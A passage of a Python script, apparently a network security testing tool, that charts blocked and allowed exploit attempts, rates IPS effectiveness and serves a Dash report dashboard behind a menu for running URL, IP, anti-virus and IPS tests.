        t9 = px.scatter(x=[1], y=[1], template="plotly_dark", title="Blocked Exploits")
        fig9=t9.add_annotation(text="'NA' \t\t\t\t***No exploits blocked, All successful***", xref="paper", yref="paper", x=0.5, y=0.5, showarrow=False, font=dict(size=15))
        ipsblock=0
    fig9.update_traces(hoverinfo='skip', hovertemplate=None)
    fig9.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    if not ipsa.empty:
        fig10=px.sunburst(ipsa, path=['Exploit_Attempted', 'CVE'], color='Exploit_Attempted', template="plotly_dark", title="Allowed Exploits", color_discrete_sequence=px.colors.qualitative.Set2)
    else:
        t10 = px.scatter(x=[1], y=[1], template="plotly_dark", title="Allowed Exploits")
        fig10=t10.add_annotation(text="'NA' \t\t\t\t***All exploits blocked, None successful***", xref="paper", yref="paper", x=0.5, y=0.5, showarrow=False, font=dict(size=15))
    fig10.update_traces(hoverinfo='skip', hovertemplate=None)
    fig10.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    print("\n\t\t ***  IPS/IDP Stats  ***")
    texp=df.Exploit_Attempted.count()
    ipsbpercent = (ipsblock / texp) * 100
    print ("\n\n \t \t IPS Block Percentage:\t\t", ipsbpercent)
    if ipsbpercent < 50:
        ipsr = "'C'   - Critical"
        ipscolor = "danger"
        print(" \t \t IPS Security Risk Rating: \t\t 'C' Critical")
    elif ipsbpercent < 75:
        ipsr = "'B'   - High-Risk"
        ipscolor = "warning"
        print(" \t \t IPS Security Risk Rating: \t\t 'B' High-Risk")
    elif ipsbpercent < 90:
        ipsr = "'A'   - Moderate-Risk"
        ipscolor = "info"    
        print(" \t \t IPS Security Risk Rating: \t\t 'A' Moderate-Risk")
    else:
        ipsr = "'A+'   - Low-Risk"
        ipscolor = "success"    
        print(" \t \t IPS Security Risk Rating: \t\t 'A+' Low-Risk")
    print("\n \t \t ===========================================================================================================\n ")
    ipstable = pd.DataFrame(
        {
            "": ["Total Exploits Attempted", "Exploits blocked by IPS"],
            "Count": [texp, ipsblock],
        }
    )
    page_idp = html.Div(dbc.Spinner(html.Div(
        [ 
         dcc.Tabs([
             dcc.Tab(label='IPS (IDP)', className="bg-secondary text-white p-2", children=[
                 html.Br(), html.Br(), html.H2(["Security Risk Rating:\t\t\t", dbc.Badge(ipsr, color=ipscolor, className="ms-1")], className="text-center"),
                 html.Br(), html.Br(), html.H3(["Overall Statistics"], className="text-center"),             
                 dbc.Table.from_dataframe(ipstable, striped=True, bordered=True, hover=True, dark=True, className="p-3 border"),
                 html.H5(html.Em(["NOTE:\t  Exploits are triggered from end-user PC"])), html.Br(),
                 html.Br(),
                 html.H3(["IPS Analysis"], className="text-center"),
                 dbc.Row([
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig9), color="warning",), lg=6),
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig10), color="warning",), lg=6),
                ],
                className="mt-4",),  html.Br(), html.Br(),
                html.Br(), html.Br(),
                html.H4(["Security Risk Rating Scale"]),
                html.H6([dbc.Badge("'C'   - Critical", color="danger", className="ms-1"),"\t\t\tBlock-Count < 50%", dbc.Badge("'B'   - High-Risk", color="warning", className="ms-1"),"\t\t\tBlock-Count < 75%", dbc.Badge("'A'   - Moderate-Risk", color="info", className="ms-1"),"\t\t\tBlock-Count < 90%", dbc.Badge("'A+'   - Low-Risk", color="success", className="ms-1"),"\t\t\tBlock-Count >= 90%"], className="text-center"), html.Br(),
                   ]),
                ])
            ]), color="info",
        ))
    return page_idp

def defpage(smod):
    def_page = html.Div([
        dcc.Tabs([
            dcc.Tab(label=smod, className="bg-secondary text-white p-2", children=[
                html.Br(), html.Br(), html.H3(["*** No results to display ***"], className="text-center"), html.Br(), html.H4([html.Em("( Run the test & check here for report )")], className="text-center"),])
        ])
    ])
    return def_page
# Dashboard
def secudash(D):
    load_figure_template("superhero")
    app = dash.Dash(__name__)    
    heading = html.H1("Security Posture Evaluation - Report", className="bg-success text-white text-center p-2")
    graphs = html.Div([ html.Br(), html.H4(["Internet Connection - UP"], className="text-center"), html.H5(["DNS Server Address:\t",D], className="text-center"),html.Br(),html.Br(),
        dcc.Location(id='url', refresh=True),
        html.Div(
            [                 
                dcc.Link(dbc.Button("Legit Websites (Allowed URLs)", color="primary", className="me-md-2"), href="/legit-sites",
                         className="d-grid gap-3",
                ),
                dcc.Link(dbc.Button("URL Filtering", color="primary", className="me-md-2"), href="/urlf",
                         className="d-grid gap-3",
                ), 
                dcc.Link(dbc.Button("IP Filtering", color="primary", className="me-md-2"), href="/ipf",
                         className="d-grid gap-3",
                ), 
                dcc.Link(dbc.Button("Anti-Virus", color="primary", className="me-md-2"), href="/av",
                         className="d-grid gap-3",
                ), 
                dcc.Link(dbc.Button("IPS/IDP", color="primary", className="me-md-2"), href="/idp-ips",
                         className="d-grid gap-3",
                ), 
            ],
            className="d-grid gap-2 d-md-flex justify-content-md-center",
        ), html.Br(), html.Br(),
        html.Div(id='page-content'),
    ])
    app.title = "Report Dashboard"        
    app.layout = dbc.Container(fluid=True, children=[heading, graphs])
    
    @app.callback(dash.dependencies.Output('page-content', 'children'),
                  [dash.dependencies.Input('url', 'pathname')])
    def display_page(pathname):
        if pathname == '/urlf':
            return page_urlf
        elif pathname == '/legit-sites':
            return page_legitsites
        elif pathname == '/ipf':
            return page_ipf
        elif pathname == '/av':
            return page_av
        elif pathname == '/idp-ips':
            return page_idp   
        else:
            return html.Div([html.Br(), html.Br(), html.H6(["Click on the links provided above to view relevant report"], className="text-center"),])
    if __name__ == '__main__':
        app.run_server(debug=False, port=8084,host='0.0.0.0')
page_legitsites = defpage('Legit Sites (Allowed URLs)')
page_urlf = defpage('URL Filtering')
page_ipf = defpage('IP Filtering')
page_av = defpage('Anti-Virus')
page_idp = defpage('IPS (IDP)')
def Internet_check():
    resolver = dns.resolver.Resolver()
    d = str(resolver.nameservers[0])
    try:
        print ("\n\nDNS Server:\t",d)
        print("\n Checking Internet connection.......")
        time.sleep(2)       
        result = resolver.query('www.google.com',"A")
        print("\n!!!!!!!     Connected to Internet    !!!!!!!")
        Inet=0
    except Exception:
        print("\n!!!!!!!     No Internet Connectivity     !!!!!!!")
        Inet=1 
    return Inet, d
I, D = Internet_check()
while (Smodule!="7" and I==0):
 time.sleep(2)
 print("\n \t ------------------------------------------  Entering Traffic Generation  ------------------------------------------ ")
 print("\n\n Choose a feature to test :\n")
 Smodule=input(" \t \t 1. Safe/Legit Websites \t 2. URL Filtering (Malicious Domains) \n \t \t 3. IP Filtering \t\t 4. Anti-Virus \n \t \t 5. IPS(IDP) \t\t\t 6. All Modules (2-5) \n \t \t 7. Exit Traffic-gen\n") 
 if Smodule=="1":
     input_url()
     page_legitsites = stats_legitsites()
     continue
 if Smodule=="2":
     url()
     page_urlf = stats_url()
     continue
 if Smodule=="3":
     ipfilter()
     page_ipf = stats_ipf()
     continue
 if Smodule=="4":
     av()
     page_av = stats_av()
     continue
 if Smodule=="5":
     ips()
     page_idp = stats_ips()
     continue
 if Smodule=="6":
     url()
     ipfilter()
     av()
     ips()
     page_urlf = stats_url()
     page_ipf = stats_ipf()
     page_av = stats_av()
     page_idp = stats_ips()
     continue
 else:
     print("\n\n ------------------------------------------  Exiting from Traffic Generation  ------------------------------------------ \n")
     break
if (I==0):
    print("\n\n \t \t  To access Report Dashboard  -  Open 'http://localhost:8084/' on Chrome or any browser \n\n\n")
    secudash(D)
else:
    print("\n\n ====================    Aborting Script  ====================\n\n")
